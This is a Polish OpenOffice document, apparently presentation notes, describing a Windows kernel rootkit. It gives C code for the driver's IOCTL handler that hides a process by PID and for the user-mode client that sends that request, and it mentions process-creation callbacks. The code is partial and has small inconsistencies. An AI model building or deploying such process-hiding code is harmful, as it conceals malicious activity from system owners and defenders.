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background-color="#ffffff">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:background-color="#ffffff">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
      <style:text-properties style:use-window-font-color="true" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P7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8" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:text-autospace="none"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2"/>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#0000ff" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:use-window-font-color="true" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties style:use-window-font-color="true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32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64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96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29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61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93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26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58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1.906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3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6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9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3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9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31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64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1.97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ARCHITEKTURA:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/>Ten rootkit składa sie z dwóch części:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P1">sterownika – zawiera główną funkcjonalność rootkita, działa w kernel mode(ring0) .</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P1">Aplikacji sterującej działającej w user-mode (ring3)</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/>Rootkit może być uruchamiany przy starcie, ale ponieważ na innym systemie mogą wystąpić błędy spowodowane różnica w konfiguracji (inne struktury, indeksy funkcji w ssdt), lepiej </text:p>
      <text:p text:style-name="Standard">przynajmniej pierwszy raz uruchomić rootkita tylko na czas działania systemu (nie uruchomi sie przy starcie). W innym przypadku źle działający rootkit może uniemożliwić normalne uruchomienie systemu. (można to ominąć poprzez uruchomienie systemu z konsola odzyskiwania i usuniecie sterownika – komendy listsvc ( wyswietla uslugi/drivery), disable &lt;nazwa_drivera&gt; - wyinstalowuje sterownik, albo uruchamiajac komputer pod kontrola innego systemu i wykasowanie sterownika z dysku.</text:p>
      <text:p text:style-name="Standard"><text:tab/>Według mnie dla potrzeb prezentacji lepiej nie uruchamiac rootkita przy starcie, tylko podczas dzialania systemu – bedzie można go wielokrotnie ladowac i wyladowywac i obserwowac dzialanie systemu bez i z rootkitem.</text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/>Aplikacja sterująca służy do załadowania drivera oraz do komunikacji z nim. W tej chwili komunikacja jest bardzo uproszczona. Istnieje tylko jedna obsługiwana metoda (ukrywanie procesów po zadanym PID'zie). </text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/>Komunikacja ze sterownikiem odbywa się za pomocą pakietów IRP. Jest to odpowiednik komunikatów w aplikacjach Windowsowych, lecz o znacznie bogatszych możliwościach.</text:p>
      <text:p text:style-name="Standard"><text:tab/>Rootkit obsługuje pakiety IRP od naszej aplikacji w specjalnie w tym celu zarejstrowanej procedurze Driver_IoControl:</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">// procedura zwraca status (rozbudowany typ bardzo często używany do zwracania wartosci sterownikach w Windows).</text:p>
      <text:p text:style-name="P3">NTSTATUS <text:s/>Driver_IoControl( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )</text:p>
      <text:p text:style-name="P4">{</text:p>
      <text:p text:style-name="P4"><text:tab/>NTSTATUS status = STATUS_SUCCESS;</text:p>
      <text:p text:style-name="P4"><text:tab/>PIO_STACK_LOCATION irpStack;</text:p>
      <text:p text:style-name="P4"><text:tab/>ULONG inputSize;</text:p>
      <text:p text:style-name="P4"><text:tab/>ULONG controlCode;</text:p>
      <text:p text:style-name="P4"><text:tab/>PVOID pInputBuffer;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>// pobieramy informacje o pakiecie IRP</text:p>
      <text:p text:style-name="P4"><text:tab/>irpStack = IoGetCurrentIrpStackLocation( Irp );</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>// kod rozróznia dokladnie, o który komunikat nam chodzi ( my obslugujemy <text:s/>IOCTL_HIDE_PROCESS)</text:p>
      <text:p text:style-name="P4"><text:tab/>controlCode = irpStack-&gt;Parameters.DeviceIoControl.IoControlCode;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>// ilosc bajtow które zostaly przyslane w tym pakiecie IRP</text:p>
      <text:p text:style-name="P4"><text:tab/>inputSize = irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</text:p>
      <text:p text:style-name="P4"><text:tab/>// wskaznik na bufor danych odebranych w tym pakiecie</text:p>
      <text:p text:style-name="P4"><text:tab/>pInputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>switch (controlCode) </text:p>
      <text:p text:style-name="P4"><text:tab/>{</text:p>
      <text:p text:style-name="P4"><text:tab/>case IOCTL_HIDE_PROCESS:</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>if (inputSize == sizeof(ULONG)) {</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>// w pakiecie znajdowalo sie jedna podwojne slowo (zmienna typu DWORD)</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>// w sterownikach uzywa sie typu ULONG tego samego rozmiaru</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>// przetypowujemy wskaznik na wskaznik do ULONG i wyluskujemy spod tego </text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>// wskaznika PID procesu , który zamierzamy ukryc</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:tab/>OnProcessHide( *(ULONG*)pInputBuffer );</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>}</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>break;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>default:</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>break;</text:p>
      <text:p text:style-name="P4"><text:tab/>}<text:tab/></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><text:tab/>// po obsluzeniu pakietu IRP trzeba zwrocic do systemu informacje czy operacja sie powiodla czy nie</text:p>
      <text:p text:style-name="P4"><text:tab/>// my zawsze zwracamy STATUS_SUCCESS (ustawiony na poczatku)</text:p>
      <text:p text:style-name="P4"><text:tab/>Irp-&gt;IoStatus.Status = status;</text:p>
      <text:p text:style-name="P4"><text:tab/>Irp-&gt;IoStatus.Information = 0;</text:p>
      <text:p text:style-name="P4"><text:tab/>IoCompleteRequest( Irp , IO_NO_INCREMENT );</text:p>
      <text:p text:style-name="P4"><text:tab/>return status;</text:p>
      <text:p text:style-name="P4">}</text:p>
      <text:p text:style-name="P5">Tak wyglada komunikacja od strony sterownika (kernel-mode).</text:p>
      <text:p text:style-name="P5">Od strony aplikacji wyglada to nastepujaco:</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><text:span text:style-name="T1">bool</text:span><text:span text:style-name="T2"> HideProcess(DWORD pid)</text:span></text:p>
      <text:p text:style-name="P6">{</text:p>
      <text:p text:style-name="P6"><text:tab/>DWORD dwReturn;</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:tab/>// otwarcie urzadzenia rootkita</text:p>
      <text:p text:style-name="P6"><text:tab/>hDevice = CreateFile(</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/><text:tab/>"\\\\.\\rootkitDrv", </text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/><text:tab/>GENERIC_READ | GENERIC_WRITE,</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/><text:tab/>FILE_SHARE_READ, NULL,</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/><text:tab/>OPEN_EXISTING,</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/><text:tab/>FILE_ATTRIBUTE_NORMAL,</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/><text:tab/>NULL);</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T1">if</text:span><text:span text:style-name="T2"> ( !hDevice ) </text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2"><text:tab/><text:tab/></text:span><text:span text:style-name="T1">return</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">false</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:tab/>// wyslanie pakietu IRP_MJ_DEVICE_CONTROL o kodzie IOCTL_HIDE_PROCESS,</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T3"><text:tab/>// kod ten jest utworzony przez specjalne makro </text:span>CTL_CODE<text:span text:style-name="T3"> po podaniu odpowiednich parametrow - </text:span></text:p>
      <text:p text:style-name="P6"><text:tab/>// takich samych w kodzie rootkita i aplikacji w user mode</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T1">if</text:span><text:span text:style-name="T2"> (!DeviceIoControl(hDevice, </text:span></text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>IOCTL_HIDE_PROCESS, </text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>&amp;pid,<text:tab/><text:tab/><text:tab/>// wysylamy zmienna pid</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T1">sizeof</text:span><text:span text:style-name="T2">(pid), <text:tab/><text:tab/>// rozmiar zmiennej</text:span></text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>NULL, <text:tab/><text:tab/><text:tab/>// nie odczytujemy nic pusty wskaznik</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>0, <text:tab/><text:tab/><text:tab/>// zero bajtow do czytania</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>&amp;dwReturn, </text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/><text:tab/>NULL))</text:p>
      <text:p text:style-name="P6"><text:tab/>{</text:p>
      <text:p text:style-name="P6"><text:tab/><text:tab/>printf("Blad podczas komunikacji z rootkitem\n");</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2"><text:tab/><text:tab/></text:span><text:span text:style-name="T1">return</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">false</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P6"><text:tab/>}</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:tab/>CloseHandle( hDriver );</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P8"><text:span text:style-name="T2"><text:tab/></text:span><text:span text:style-name="T1">return</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">true</text:span><text:span text:style-name="T2">;</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T2">}</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="Standard">FUNCJONALNOSC:</text:p>
      <text:p text:style-name="Standard"/>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P9"><text:span text:style-name="T4">chowanie procesów po nazwie</text:span>. Rootkit rejestruje procedurę typu callback <text:s text:c="3"/>- wywoływana przez inny kod ( w tym przypadku system) podczas zaistnienia pewnych warunkow. </text:p>
              <text:p text:style-name="P9">PsSetCreateProcessNotifyRoutine ( ProcessNotify, FALSE )</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/>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ux.pl/2.0$Win32 OpenOffice.org_project/680m3$Build-8968</meta:generator>
    <meta:creation-date>2006-06-12T20:33:56</meta:creation-date>
    <dc:date>2006-06-12T21:17:40</dc:date>
    <dc:language>pl-PL</dc:language>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:editing-duration>PT43M4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88" meta:word-count="521" meta:character-count="4208"/>
  </office:meta>
</office:document-meta>
</file>